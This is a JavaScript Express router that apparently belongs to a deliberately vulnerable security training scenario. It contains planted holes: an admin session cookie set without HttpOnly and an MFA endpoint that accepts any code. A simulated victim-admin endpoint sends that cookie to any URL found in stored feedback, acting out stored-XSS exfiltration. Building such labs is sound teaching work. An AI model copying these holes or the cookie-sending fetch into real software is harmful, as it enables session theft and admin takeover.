import { Router } from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { feedbackService } from "../services/feedbackService.js";
import { telemetryService } from "../services/telemetryService.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const router = Router();
const robotsPath = path.resolve(__dirname, "../public/robots.txt");
const loginHtmlPath = path.resolve(__dirname, "../views/login.html");

// Serve robots.txt explicitly to ensure consistent content-type
router.get("/robots.txt", (req, res) => {
  res.type("text/plain");
  if (fs.existsSync(robotsPath)) {
    return res.sendFile(robotsPath);
  }
  return res.send("User-agent: *\nDisallow: /api/verify-mfa\n");
});

// Admin sign-in / victim simulation portal
router.get(["/login", "/admin/login"], (req, res) => {
  if (fs.existsSync(loginHtmlPath)) {
    return res.sendFile(loginHtmlPath);
  }
  res.redirect("/");
});

// POST /api/verify-mfa - legitimate admin MFA completion
router.post("/api/verify-mfa", (req, res) => {
  const mfaCode = req.body?.mfa_code || req.body?.code;
  const username = req.body?.username || "secadmin_01";
  const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";

  if (!mfaCode) {
    return res.status(403).json({
      endpoint: "/api/verify-mfa",
      status: "restricted",
      message: "Multi-Factor Authentication (MFA) endpoint. Direct access prohibited without active admin challenge."
    });
  }

  // Issue legitimate admin session cookie (SCENARIO75{adm_sess}) with HttpOnly: false
  const token = `adm_sess_secadmin_01_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 8)}`;
  res.cookie("adm_sess", token, {
    httpOnly: false,
    path: "/",
    sameSite: "lax"
  });

  telemetryService.logSecurityEvent("INFO", `[AUTH] MFA verification successful for user ${username} from ${clientIp}, session adm_sess issued`);

  return res.status(200).json({
    success: true,
    user: username,
    sessionCookie: `adm_sess=${token}`,
    redirect: "/dashboard",
    message: "MFA challenge verified successfully. Admin session issued."
  });
});

// GET /api/verify-mfa (and any direct/unauthenticated requests) - strictly 403 Forbidden
router.all("/api/verify-mfa", (req, res) => {
  res.status(403).json({
    endpoint: "/api/verify-mfa",
    status: "restricted",
    message: "Multi-Factor Authentication (MFA) endpoint. Direct access prohibited without active admin challenge."
  });
});

// POST /api/admin/simulate-review - automated victim admin review simulation
router.post("/api/admin/simulate-review", async (req, res) => {
  const adminToken = `adm_sess_secadmin_01_simulated_${Date.now().toString(36)}`;
  const feedbacks = feedbackService.getAll();
  const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";

  telemetryService.logSecurityEvent("INFO", `[AUTH] Admin secadmin_01 logged in with MFA and opened /dashboard to review feedback items`);

  let triggeredXss = false;
  let exfiltratedUrl = null;

  for (const item of feedbacks) {
    const msg = String(item.message || "");
    // Detect exfiltration URLs inside stored XSS payloads
    const urlMatch = msg.match(/https?:\/\/[^\s'"\)>]+/i);
    if (urlMatch) {
      triggeredXss = true;
      let targetUrl = urlMatch[0];
      
      // If the URL has an exfiltration query parameter, append the admin's cookie
      if (targetUrl.includes("?") || targetUrl.includes("=")) {
        targetUrl += encodeURIComponent(`adm_sess=${adminToken}`);
      } else {
        targetUrl += `?c=${encodeURIComponent(`adm_sess=${adminToken}`)}`;
      }
      exfiltratedUrl = targetUrl;

      // Attempt to fire outbound HTTP exfiltration request asynchronously
      try {
        fetch(targetUrl, {
          method: "GET",
          headers: { "User-Agent": "Mozilla/5.0 (Admin Browser Simulation)" },
          signal: AbortSignal.timeout(1500)
        }).catch(() => {}); // Fire and forget
      } catch {
        // Ignore listener connection errors
      }
      break;
    }
  }

  return res.status(200).json({
    success: true,
    simulatedAdmin: "secadmin_01",
    adminSessionCookie: `adm_sess=${adminToken}`,
    feedbackItemsReviewed: feedbacks.length,
    triggeredXss,
    exfiltratedTo: exfiltratedUrl,
    message: triggeredXss
      ? `Victim admin secadmin_01 reviewed feedback on /dashboard! Stored XSS triggered and cookie '${adminToken}' was exfiltrated.`
      : `Victim admin secadmin_01 reviewed feedback on /dashboard. No XSS callback URL detected in the current queue.`
  });
});

export default router;
